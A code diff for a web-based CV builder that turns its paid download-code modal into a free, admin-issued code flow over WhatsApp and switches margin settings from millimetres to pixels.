@@ -279,74 +279,72 @@ input:checked+.slider::after{transform:translateX(22px);}
 #print-overlay{display:none;}
 
 /* ═══════════════════════════════════════════════════════
-   DOWNLOAD CODE MODAL — Payment version
+   DOWNLOAD CODE MODAL — Free version, no payment
 ═══════════════════════════════════════════════════════ */
-#pay-modal{display:none;position:fixed;inset:0;z-index:10000;background:rgba(15,23,42,.8);backdrop-filter:blur(6px);align-items:flex-end;justify-content:center;}
+#pay-modal{display:none;position:fixed;inset:0;z-index:10000;background:rgba(15,23,42,.75);backdrop-filter:blur(6px);align-items:flex-end;justify-content:center;}
 #pay-modal.show{display:flex;}
 @media(min-width:540px){#pay-modal{align-items:center;padding:20px;}}
-#pay-box{background:#fff;border-radius:22px 22px 0 0;width:100%;max-width:440px;overflow:hidden;box-shadow:0 -4px 40px rgba(0,0,0,.22);animation:paySlide .28s cubic-bezier(.25,1,.5,1);}
-@media(min-width:540px){#pay-box{border-radius:20px;animation:payPop .25s cubic-bezier(.25,1,.5,1);}}
-@keyframes paySlide{from{transform:translateY(50px);opacity:.5}to{transform:none;opacity:1}}
-@keyframes payPop{from{transform:scale(.95);opacity:0}to{transform:none;opacity:1}}
-#pay-header{background:#1E293B;padding:16px 20px 20px;position:relative;}
-.pay-pill{width:34px;height:4px;background:rgba(255,255,255,.16);border-radius:99px;margin:0 auto 14px;}
-.pay-close-x{position:absolute;top:12px;right:14px;width:28px;height:28px;border-radius:50%;border:none;background:rgba(255,255,255,.1);color:rgba(255,255,255,.65);font-size:15px;cursor:pointer;display:flex;align-items:center;justify-content:center;line-height:1;}
-.pay-close-x:hover{background:rgba(255,255,255,.2);color:#fff;}
-.pay-lock-icon{width:40px;height:40px;background:rgba(255,255,255,.1);border-radius:12px;display:flex;align-items:center;justify-content:center;margin-bottom:10px;}
-#pay-header h2{color:#fff;font-size:17px;font-weight:900;margin-bottom:4px;letter-spacing:-.2px;}
-#pay-header .pay-sub{color:rgba(255,255,255,.5);font-size:11.5px;line-height:1.55;}
-.pay-price-tag{display:inline-flex;align-items:baseline;gap:1px;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.14);border-radius:99px;padding:4px 14px 5px;margin-top:11px;}
-.pay-price-tag .sym{color:rgba(255,255,255,.7);font-size:12px;font-weight:700;}
-.pay-price-tag .num{color:#fff;font-size:22px;font-weight:900;letter-spacing:-.5px;line-height:1;}
-.pay-price-tag .lbl{color:rgba(255,255,255,.4);font-size:10.5px;margin-left:4px;}
-#pay-body{padding:18px 18px 24px;}
-@media(min-width:540px){#pay-body{padding:20px 22px 28px;}}
-.pay-cards{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
-.pay-card{border:2px solid #E2E8F0;border-radius:16px;padding:16px 10px 14px;text-align:center;cursor:pointer;background:#FAFCFF;transition:border-color .15s,background .15s;-webkit-tap-highlight-color:transparent;user-select:none;}
-.pay-card:active{transform:scale(.97);}
-.pay-card:hover{border-color:#1E293B;background:#F1F5F9;}
-.pay-card-ico{width:42px;height:42px;border-radius:12px;margin:0 auto 10px;display:flex;align-items:center;justify-content:center;}
-.pay-card-ico.c-blue{background:#EFF6FF;}
+#pay-box{background:#fff;border-radius:24px 24px 0 0;width:100%;max-width:460px;overflow:hidden;box-shadow:0 -6px 40px rgba(0,0,0,.22);animation:paySlide .3s cubic-bezier(.25,1,.5,1);}
+@media(min-width:540px){#pay-box{border-radius:22px;animation:payPop .25s cubic-bezier(.25,1,.5,1);}}
+@keyframes paySlide{from{transform:translateY(60px);opacity:.4}to{transform:none;opacity:1}}
+@keyframes payPop{from{transform:scale(.94);opacity:0}to{transform:none;opacity:1}}
+/* Header */
+#pay-header{background:linear-gradient(135deg,#0F766E 0%,#0D6B63 100%);padding:20px 20px 22px;position:relative;}
+.pay-pill{width:36px;height:4px;background:rgba(255,255,255,.22);border-radius:99px;margin:0 auto 16px;}
+.pay-close-x{position:absolute;top:14px;right:16px;width:30px;height:30px;border-radius:50%;border:none;background:rgba(255,255,255,.12);color:rgba(255,255,255,.7);font-size:15px;cursor:pointer;display:flex;align-items:center;justify-content:center;}
+.pay-close-x:hover{background:rgba(255,255,255,.22);color:#fff;}
+.pay-dl-icon{width:44px;height:44px;background:rgba(255,255,255,.14);border-radius:13px;display:flex;align-items:center;justify-content:center;margin-bottom:11px;}
+#pay-header h2{color:#fff;font-size:18px;font-weight:900;margin-bottom:5px;letter-spacing:-.3px;}
+#pay-header .pay-sub{color:rgba(255,255,255,.65);font-size:12px;line-height:1.6;}
+.free-badge{display:inline-flex;align-items:center;gap:5px;background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.22);border-radius:99px;padding:4px 13px 5px;margin-top:12px;color:#fff;font-size:11px;font-weight:800;letter-spacing:.4px;}
+/* Body */
+#pay-body{padding:20px 20px 26px;}
+@media(min-width:540px){#pay-body{padding:22px 24px 30px;}}
+/* Choice cards */
+.pay-cards{display:grid;grid-template-columns:1fr 1fr;gap:11px;margin-bottom:4px;}
+.pay-card{border:2px solid #E2E8F0;border-radius:18px;padding:18px 12px 16px;text-align:center;cursor:pointer;background:#FAFCFF;transition:all .18s;-webkit-tap-highlight-color:transparent;user-select:none;}
+.pay-card:active{transform:scale(.96);}
+.pay-card:hover{border-color:#0F766E;background:#F0FDFA;box-shadow:0 4px 20px rgba(15,118,110,.1);}
+.pay-card-ico{width:46px;height:46px;border-radius:13px;margin:0 auto 11px;display:flex;align-items:center;justify-content:center;}
 .pay-card-ico.c-green{background:#F0FDF4;}
-.pay-card h3{font-size:13px;font-weight:800;color:#1E293B;margin-bottom:3px;}
-.pay-card p{font-size:11px;color:#64748B;line-height:1.4;}
+.pay-card-ico.c-teal{background:#F0FDFA;}
+.pay-card h3{font-size:13.5px;font-weight:800;color:#1E293B;margin-bottom:4px;}
+.pay-card p{font-size:11px;color:#64748B;line-height:1.45;}
+/* WhatsApp section */
 #pay-upi-sec{display:none;}
-.qr-wrap{background:#F8FAFC;border:1.5px solid #E2E8F0;border-radius:16px;padding:16px;display:flex;flex-direction:column;align-items:center;margin-bottom:12px;}
-.qr-wrap canvas,.qr-wrap img{border-radius:8px;}
-.qr-hint{font-size:11px;color:#94A3B8;font-weight:600;margin-top:8px;text-align:center;}
-.upi-row{display:flex;align-items:center;gap:8px;background:#F8FAFC;border:1.5px solid #E2E8F0;border-radius:12px;padding:11px 14px;margin-bottom:10px;}
-.upi-text{flex:1;min-width:0;}
-.upi-lbl{font-size:9.5px;color:#94A3B8;font-weight:700;text-transform:uppercase;letter-spacing:.8px;margin-bottom:2px;}
-.upi-val{font-size:13px;font-weight:800;color:#1E293B;word-break:break-all;letter-spacing:.2px;}
-.copy-btn{padding:9px 14px;background:#1E293B;color:#fff;border:none;border-radius:9px;font-size:12px;font-weight:700;cursor:pointer;white-space:nowrap;flex-shrink:0;}
-.copy-btn:active{opacity:.8;}
-.send-note{background:#F0FDF4;border:1.5px solid #86EFAC;border-radius:10px;padding:10px 14px;font-size:12px;color:#166534;font-weight:700;text-align:center;margin-bottom:14px;display:flex;align-items:center;justify-content:center;gap:6px;}
-.wa-btn{width:100%;padding:15px;background:#22C55E;color:#fff;border:none;border-radius:14px;font-weight:800;font-size:15px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;-webkit-tap-highlight-color:transparent;}
-.wa-btn:active{background:#16A34A;}
-.back-lnk{text-align:center;margin-top:14px;font-size:12px;color:#94A3B8;cursor:pointer;padding:6px;}
+.wa-info-box{background:#F0FDF4;border:1.5px solid #86EFAC;border-radius:14px;padding:14px 16px;margin-bottom:14px;}
+.wa-info-title{font-size:13px;font-weight:800;color:#166534;margin-bottom:8px;display:flex;align-items:center;gap:6px;}
+.wa-info-step{font-size:12px;color:#15803D;line-height:1.8;display:flex;gap:8px;align-items:flex-start;}
+.wa-step-num{min-width:20px;height:20px;border-radius:50%;background:#22C55E;color:#fff;font-size:10px;font-weight:800;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:2px;}
+.wa-btn{width:100%;padding:16px;background:#25D366;color:#fff;border:none;border-radius:14px;font-weight:800;font-size:15px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;-webkit-tap-highlight-color:transparent;box-shadow:0 4px 16px rgba(37,211,102,.3);}
+.wa-btn:active{background:#1ebe5a;}
+.back-lnk{text-align:center;margin-top:14px;font-size:12.5px;color:#94A3B8;cursor:pointer;padding:6px;font-weight:600;}
 .back-lnk:hover{color:#475569;}
+/* Code entry section */
 #pay-code-sec{display:none;}
-.code-steps{font-size:12px;color:#475569;margin-bottom:14px;background:#F8FAFC;border:1.5px solid #E2E8F0;border-radius:12px;padding:12px 14px;line-height:1.8;}
-.code-steps strong{color:#1E293B;}
+.code-how-box{background:#F8FAFC;border:1.5px solid #E2E8F0;border-radius:13px;padding:13px 15px;margin-bottom:14px;}
+.code-how-title{font-size:12px;font-weight:800;color:#1E293B;margin-bottom:8px;}
+.code-how-step{font-size:11.5px;color:#475569;line-height:1.75;display:flex;gap:8px;}
+.code-how-num{min-width:18px;height:18px;border-radius:50%;background:#0F766E;color:#fff;font-size:9px;font-weight:800;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:2px;}
 .code-lbl{font-size:12px;font-weight:700;color:#1E293B;margin-bottom:8px;display:block;}
-.code-dots{display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:12px;}
-.cdot{width:11px;height:11px;border-radius:50%;background:#E2E8F0;transition:background .2s;}
+.code-dots{display:flex;align-items:center;justify-content:center;gap:7px;margin-bottom:13px;}
+.cdot{width:12px;height:12px;border-radius:50%;background:#E2E8F0;transition:background .2s;}
 .cdot.used{background:#EF4444;}
-.cdot-lbl{font-size:11px;color:#94A3B8;margin-left:2px;}
-.code-field{width:100%;padding:18px 10px;border:2.5px solid #E2E8F0;border-radius:14px;font-size:28px;font-weight:900;text-align:center;letter-spacing:10px;text-transform:uppercase;outline:none;font-family:'Courier New',monospace;color:#1E293B;background:#FAFCFF;transition:border-color .15s,box-shadow .15s;-webkit-tap-highlight-color:transparent;margin-bottom:8px;}
-.code-field:focus{border-color:#334155;box-shadow:0 0 0 4px rgba(30,41,59,.07);}
+.cdot-lbl{font-size:11px;color:#94A3B8;margin-left:3px;font-weight:600;}
+.code-field{width:100%;padding:18px 10px;border:2.5px solid #E2E8F0;border-radius:14px;font-size:30px;font-weight:900;text-align:center;letter-spacing:12px;text-transform:uppercase;outline:none;font-family:'Courier New',monospace;color:#1E293B;background:#FAFCFF;transition:border-color .15s,box-shadow .15s;-webkit-tap-highlight-color:transparent;margin-bottom:8px;}
+.code-field:focus{border-color:#0F766E;box-shadow:0 0 0 4px rgba(15,118,110,.1);}
 .code-field.err{border-color:#EF4444;box-shadow:0 0 0 4px rgba(239,68,68,.08);animation:cshake .35s;}
-.code-field.ok{border-color:#22C55E;box-shadow:0 0 0 4px rgba(34,197,94,.09);}
+.code-field.ok{border-color:#22C55E;box-shadow:0 0 0 4px rgba(34,197,94,.1);}
 @keyframes cshake{0%,100%{transform:translateX(0)}25%{transform:translateX(-8px)}75%{transform:translateX(8px)}50%{transform:translateX(4px)}}
-.code-pool-hint{font-size:11px;color:#94A3B8;text-align:center;margin-bottom:14px;line-height:1.6;}
+.code-pool-hint{font-size:11px;color:#94A3B8;text-align:center;margin-bottom:14px;}
 .err-box{background:#FEF2F2;border:1.5px solid #FECACA;border-radius:10px;padding:10px 14px;font-size:12px;color:#991B1B;font-weight:600;margin-bottom:12px;display:none;text-align:center;line-height:1.5;}
 .lock-box{background:#FFF7ED;border:1.5px solid #FED7AA;border-radius:12px;padding:14px;display:none;text-align:center;margin-bottom:12px;}
 .lock-title{font-size:13px;color:#9A3412;font-weight:800;margin-bottom:6px;}
 .lock-time{font-size:28px;font-weight:900;color:#C2410C;letter-spacing:3px;line-height:1;}
 .lock-sub{font-size:11px;color:#9A3412;margin-top:5px;}
-.unlock-btn{width:100%;padding:15px;background:#1E293B;color:#fff;border:none;border-radius:14px;font-weight:900;font-size:15px;cursor:pointer;-webkit-tap-highlight-color:transparent;display:flex;align-items:center;justify-content:center;gap:8px;}
-.unlock-btn:active{background:#374151;}
-.unlock-btn:disabled{background:#CBD5E1;cursor:not-allowed;}
+.unlock-btn{width:100%;padding:16px;background:#0F766E;color:#fff;border:none;border-radius:14px;font-weight:900;font-size:15px;cursor:pointer;-webkit-tap-highlight-color:transparent;display:flex;align-items:center;justify-content:center;gap:9px;box-shadow:0 4px 16px rgba(15,118,110,.25);}
+.unlock-btn:active{background:#0D6B63;}
+.unlock-btn:disabled{background:#CBD5E1;cursor:not-allowed;box-shadow:none;}
 
 /* Admin panel */
 #admin-panel{display:none;position:fixed;inset:0;z-index:10001;background:rgba(0,0,0,.88);backdrop-filter:blur(10px);align-items:center;justify-content:center;padding:20px;}
@@ -797,17 +795,17 @@ input:checked+.slider::after{transform:translateX(22px);}
           <div style="font-size:11px;font-weight:700;color:#166534;margin-bottom:6px;">📐 Margin Settings</div>
           <div class="g2" style="gap:10px;">
             <div class="field" style="margin:0;">
-              <label style="font-size:11px;">Bottom margin — Page 1 (mm)</label>
-              <input type="number" id="margin_p1_b" value="10" min="0" max="40" oninput="autoSave();schedulePreview()" style="font-size:13px;"/>
+              <label style="font-size:11px;">Bottom margin — Page 1 (px)</label>
+              <input type="number" id="margin_p1_b" value="36" min="10" max="80" oninput="autoSave()" style="font-size:13px;"/>
             </div>
             <div class="field" style="margin:0;">
-              <label style="font-size:11px;">Top margin — Page 2+ (mm)</label>
-              <input type="number" id="margin_p2_t" value="10" min="0" max="40" oninput="autoSave();schedulePreview()" style="font-size:13px;"/>
+              <label style="font-size:11px;">Top margin — Page 2+ (px)</label>
+              <input type="number" id="margin_p2_t" value="36" min="10" max="80" oninput="autoSave()" style="font-size:13px;"/>
             </div>
           </div>
           <div class="field" style="margin:8px 0 0;">
-            <label style="font-size:11px;">Bottom margin — Page 2+ (mm)</label>
-            <input type="number" id="margin_p2_b" value="10" min="0" max="40" oninput="autoSave();schedulePreview()" style="font-size:13px;"/>
+            <label style="font-size:11px;">Bottom margin — Page 2+ (px)</label>
+            <input type="number" id="margin_p2_b" value="36" min="10" max="80" oninput="autoSave()" style="font-size:13px;"/>
           </div>
         </div>
       </div>
@@ -1037,82 +1035,138 @@ input:checked+.slider::after{transform:translateX(22px);}
 <!-- DOWNLOAD CODE MODAL — Free Version -->
 <div id="pay-modal">
   <div id="pay-box">
+
+    <!-- Header -->
     <div id="pay-header">
       <div class="pay-pill"></div>
       <button class="pay-close-x" onclick="closePayModal()" aria-label="Close">&#x2715;</button>
-      <div class="pay-lock-icon">
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.8)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+      <div class="pay-dl-icon">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.9)" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/>
+          <polyline points="7 10 12 15 17 10"/>
+          <line x1="12" y1="15" x2="12" y2="3"/>
+        </svg>
       </div>
-      <h2>Download Clean PDF</h2>
-      <p class="pay-sub">Pay &#x20B9;5 &rarr; Message us on WhatsApp &rarr; Get a code &rarr; 1-Day Access</p>
-      <div class="pay-price-tag"><span class="sym">&#x20B9;</span><span class="num">5</span><span class="lbl">1-day access</span></div>
+      <h2>Download Your CV</h2>
+      <p class="pay-sub">Your CV is ready! Get a free download code from admin to unlock it.</p>
+      <div class="free-badge">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        FREE — No Payment Required
+      </div>
     </div>
+
     <div id="pay-body">
+
+      <!-- Screen 1: Choose path -->
       <div id="pay-chooser">
+        <p style="font-size:12px;color:#64748B;text-align:center;margin-bottom:14px;line-height:1.6;">Choose how you want to get your download code from admin:</p>
         <div class="pay-cards">
+          <!-- Option A: WhatsApp admin -->
           <div class="pay-card" onclick="showUPISec()" tabindex="0">
-            <div class="pay-card-ico c-blue">
-              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#3B82F6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg>
-            </div>
-            <h3>Pay &#x20B9;5</h3><p>New here? Pay &#x20B9;5 for full-day access</p>
-          </div>
-          <div class="pay-card" onclick="showCodeSec()" tabindex="0">
             <div class="pay-card-ico c-green">
-              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#22C55E" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="#22C55E">
+                <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/>
+                <path d="M12 0C5.373 0 0 5.373 0 12c0 2.099.539 4.073 1.482 5.796L0 24l6.371-1.461A11.94 11.94 0 0012 24c6.627 0 12-5.373 12-12S18.627 0 12 0zm0 22c-1.885 0-3.655-.508-5.183-1.393l-.371-.22-3.781.866.896-3.683-.242-.381A9.944 9.944 0 012 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10z"/>
+              </svg>
             </div>
-            <h3>Enter Code</h3><p>Already paid? Type the code we sent you</p>
+            <h3>Ask Admin</h3>
+            <p>Message admin on WhatsApp to get your code</p>
+          </div>
+          <!-- Option B: Already have code -->
+          <div class="pay-card" onclick="showCodeSec()" tabindex="0">
+            <div class="pay-card-ico c-teal">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0F766E" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="3" y="11" width="18" height="11" rx="2"/>
+                <path d="M7 11V7a5 5 0 0110 0v4"/>
+              </svg>
+            </div>
+            <h3>I Have a Code</h3>
+            <p>Already got your code? Enter it and download</p>
           </div>
         </div>
       </div>
+
+      <!-- Screen 2a: WhatsApp Admin -->
       <div id="pay-upi-sec">
-        <div class="qr-wrap">
-          <div id="pay-qr-canvas"></div>
-          <p class="qr-hint">Scan with GPay, PhonePe, Paytm — or copy ID below</p>
-        </div>
-        <div class="upi-row">
-          <div class="upi-text">
-            <div class="upi-lbl">UPI ID</div>
-            <div class="upi-val" id="upi-display">&#8226; &#8226; &#8226; &#8226; &#8226; &#8226;</div>
+        <div class="wa-info-box">
+          <div class="wa-info-title">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="#22C55E"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/><path d="M12 0C5.373 0 0 5.373 0 12c0 2.099.539 4.073 1.482 5.796L0 24l6.371-1.461A11.94 11.94 0 0012 24c6.627 0 12-5.373 12-12S18.627 0 12 0zm0 22c-1.885 0-3.655-.508-5.183-1.393l-.371-.22-3.781.866.896-3.683-.242-.381A9.944 9.944 0 012 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10z"/></svg>
+            How to get your code
           </div>
-          <button class="copy-btn" onclick="copyUPI()" id="copy-upi-btn">Copy</button>
-        </div>
-        <div class="send-note">
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#166534" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
-          Send exactly <strong style="margin:0 3px;">&#x20B9;5</strong> — then press the button below
+          <div style="display:flex;flex-direction:column;gap:7px;">
+            <div class="wa-info-step"><div class="wa-step-num">1</div><span>Click the WhatsApp button below to message admin</span></div>
+            <div class="wa-info-step"><div class="wa-step-num">2</div><span>Tell admin your name and that your CV is ready</span></div>
+            <div class="wa-info-step"><div class="wa-step-num">3</div><span>Admin will send you a 6-character download code</span></div>
+            <div class="wa-info-step"><div class="wa-step-num">4</div><span>Come back, click "I Have a Code" and enter it to download</span></div>
+          </div>
         </div>
         <button class="wa-btn" onclick="openWhatsApp()">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/><path d="M12 0C5.373 0 0 5.373 0 12c0 2.099.539 4.073 1.482 5.796L0 24l6.371-1.461A11.94 11.94 0 0012 24c6.627 0 12-5.373 12-12S18.627 0 12 0zm0 22c-1.885 0-3.655-.508-5.183-1.393l-.371-.22-3.781.866.896-3.683-.242-.381A9.944 9.944 0 012 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10z"/></svg>
-          I Paid — Message Us for Code
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="white">
+            <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/>
+            <path d="M12 0C5.373 0 0 5.373 0 12c0 2.099.539 4.073 1.482 5.796L0 24l6.371-1.461A11.94 11.94 0 0012 24c6.627 0 12-5.373 12-12S18.627 0 12 0zm0 22c-1.885 0-3.655-.508-5.183-1.393l-.371-.22-3.781.866.896-3.683-.242-.381A9.944 9.944 0 012 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10z"/>
+          </svg>
+          💬 Message Admin on WhatsApp
         </button>
-        <div class="back-lnk" onclick="backToChooser()">&#8592; Go back</div>
+        <div class="back-lnk" onclick="backToChooser()">&#8592; Back &nbsp;&middot;&nbsp; <span onclick="showCodeSec()" style="color:#0F766E;font-weight:700;">I already have a code</span></div>
       </div>
+
+      <!-- Screen 2b: Enter Code -->
       <div id="pay-code-sec">
+
         <div class="err-box" id="err-box"></div>
+
         <div class="lock-box" id="lock-box">
           <div class="lock-title">Too many wrong attempts</div>
           <div class="lock-time" id="lock-timer">10:00</div>
           <div class="lock-sub">Please wait, then try again</div>
         </div>
-        <div class="code-steps">
-          <strong>How to get your code:</strong><br/>
-          1. Pay &#x20B9;5 to our UPI ID<br/>
-          2. Send us the payment screenshot on WhatsApp<br/>
-          3. We will send you a 6-letter code<br/>
-          4. Type the code below and download your CV
+
+        <div class="code-how-box">
+          <div class="code-how-title">📋 How to get your code</div>
+          <div style="display:flex;flex-direction:column;gap:6px;">
+            <div class="code-how-step"><div class="code-how-num">1</div><span>Go back and click <strong>Ask Admin</strong></span></div>
+            <div class="code-how-step"><div class="code-how-num">2</div><span>Message admin on WhatsApp to request your code</span></div>
+            <div class="code-how-step"><div class="code-how-num">3</div><span>Admin sends you a 6-character code</span></div>
+            <div class="code-how-step"><div class="code-how-num">4</div><span>Enter the code below and download your CV</span></div>
+          </div>
         </div>
+
         <div class="code-dots">
-          <div class="cdot" id="cd1"></div><div class="cdot" id="cd2"></div><div class="cdot" id="cd3"></div>
+          <div class="cdot" id="cd1"></div>
+          <div class="cdot" id="cd2"></div>
+          <div class="cdot" id="cd3"></div>
           <span class="cdot-lbl">attempts remaining</span>
         </div>
-        <label class="code-lbl" for="code-field">Enter your code here</label>
-        <input class="code-field" id="code-field" maxlength="6" placeholder="&#xB7; &#xB7; &#xB7; &#xB7; &#xB7; &#xB7;" oninput="this.value=this.value.toUpperCase().replace(/[^A-Z0-9]/g,'')" onkeydown="if(event.key==='Enter')doSubmitCode()" autocomplete="off" spellcheck="false" inputmode="text"/>
-        <div class="code-pool-hint">Enter the 6-character code exactly as received</div>
+
+        <label class="code-lbl" for="code-field">Enter your 6-character code</label>
+        <input
+          class="code-field"
+          id="code-field"
+          maxlength="6"
+          placeholder="&#xB7; &#xB7; &#xB7; &#xB7; &#xB7; &#xB7;"
+          oninput="this.value=this.value.toUpperCase().replace(/[^A-Z0-9]/g,'')"
+          onkeydown="if(event.key==='Enter')doSubmitCode()"
+          autocomplete="off"
+          spellcheck="false"
+          inputmode="text"
+        />
+        <div class="code-pool-hint">Enter the 6-character code sent by admin</div>
+
         <button class="unlock-btn" id="unlock-btn" onclick="doSubmitCode()">
-          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
-          Unlock &amp; Download
+          <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/>
+            <polyline points="7 10 12 15 17 10"/>
+            <line x1="12" y1="15" x2="12" y2="3"/>
+          </svg>
+          Download My CV
         </button>
-        <div class="back-lnk" onclick="backToChooser()">&#8592; Go back &nbsp;&middot;&nbsp;<span onclick="showUPISec()" style="color:#3B82F6;font-weight:700;cursor:pointer;">Pay &#x20B9;5</span></div>
+
+        <div class="back-lnk" onclick="backToChooser()">
+          &#8592; Back &nbsp;&middot;&nbsp;
+          <span onclick="showUPISec()" style="color:#22C55E;font-weight:700;cursor:pointer;">Ask admin for code</span>
+        </div>
       </div>
+
     </div>
   </div>
 </div>
@@ -1297,13 +1351,6 @@ function loadSlot(slot) {
         if (tog_photo) tog_photo.checked = d.extras.photo !== false;
         if (tog_father) tog_father.checked = d.extras.father !== false;
       }
-      // ── Restore margin settings ──
-      const mp1b = document.getElementById('margin_p1_b');
-      const mp2t = document.getElementById('margin_p2_t');
-      const mp2b = document.getElementById('margin_p2_b');
-      if (mp1b) mp1b.value = (d.margin_p1_b != null ? d.margin_p1_b : 10);
-      if (mp2t) mp2t.value = (d.margin_p2_t != null ? d.margin_p2_t : 10);
-      if (mp2b) mp2b.value = (d.margin_p2_b != null ? d.margin_p2_b : 10);
     } else {
       resetState();
     }
@@ -2122,11 +2169,9 @@ function renderPreview() {
   const styles = getCVStyles(currentColor);
   const active = getActiveSections();
   const html = buildCV(data, currentTemplate, currentColor, currentSpacing, currentFontSize, active);
-  const _mm2px = mm => Math.round(mm * 595 / 210);
-  const MT2_prev = _mm2px(parseInt(document.getElementById('margin_p2_t')?.value) || 10);
   const pageBreakCSS = `
-    .page-break-line{height:${MT2_prev}px;background:#e2e8f0;margin:0;position:relative;display:flex;align-items:center;justify-content:center;}
-    .page-break-line::after{content:'--- Page Break ---';font-size:8px;color:#94a3b8;padding:0 6px;}
+    .page-break-line{height:12px;background:#e2e8f0;margin:0;position:relative;}
+    .page-break-line::after{content:'--- Page 2 ---';position:absolute;left:50%;transform:translateX(-50%);top:-1px;font-size:8px;color:#94a3b8;background:#e2e8f0;padding:0 6px;}
   `;
